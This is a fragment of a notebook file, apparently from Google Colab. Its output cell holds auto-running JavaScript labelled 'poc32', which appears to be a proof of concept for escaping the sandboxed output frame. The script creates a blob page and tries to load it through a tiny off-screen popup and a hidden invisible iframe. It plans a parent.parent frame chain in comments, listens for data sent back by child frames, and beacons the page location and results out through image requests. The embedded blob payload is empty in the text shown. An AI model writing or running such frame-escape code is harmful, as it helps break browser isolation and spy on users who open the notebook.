      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": "\n(function() {\n  var B = 'https://colab.research.google.com/__poc32';\n  var L = function(t,v) {\n    new Image().src = B+'/'+t+'?v='+encodeURIComponent(String(v||'').slice(0,900));\n  };\n\n  L('START', location.origin + '|' + location.href.slice(0,100));\n\n  // Create the blob page\n  var blobHtml = atob('');\n  var blob = new Blob([blobHtml], {type: 'text/html'});\n  var blobUrl = URL.createObjectURL(blob);\n  L('BLOB_CREATED', blobUrl.slice(0, 80));\n\n  // ---- Approach A: window.open (needs to survive popup blocker) ----\n  var w = null;\n  try {\n    w = window.open(blobUrl, '_blank', 'width=1,height=1,left=-999,top=-999');\n    L('WINDOW_OPEN', w ? 'ok' : 'blocked_null');\n  } catch(e) {\n    L('WINDOW_OPEN_ERR', e.message.slice(0, 100));\n  }\n\n  // ---- Approach B: iframe (no popup needed, parent.parent chain) ----\n  // Create blob URL page as iframe directly in our output frame\n  // Chain: our frame -> iframe(blob page) -> iframe(outputframe.html)\n  // From innermost frame: window.parent.parent = our original frame\n  try {\n    var fr = document.createElement('iframe');\n    fr.src = blobUrl;\n    fr.style.cssText = 'width:1px;height:1px;opacity:0;position:absolute;left:-9999px;';\n    document.body.appendChild(fr);\n    L('IFRAME_B', 'appended');\n  } catch(e) {\n    L('IFRAME_B_ERR', e.message.slice(0, 100));\n  }\n\n  // Listen for any messages from child frames (e.g. if eval sends back data)\n  window.addEventListener('message', function(e) {\n    if (e.data && e.data.__poc32_result) {\n      L('CHILD_MSG', JSON.stringify(e.data.__poc32_result).slice(0, 500));\n    }\n  });\n\n  L('INIT_DONE', 'approaches_A_and_B_launched');\n})();\n",
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
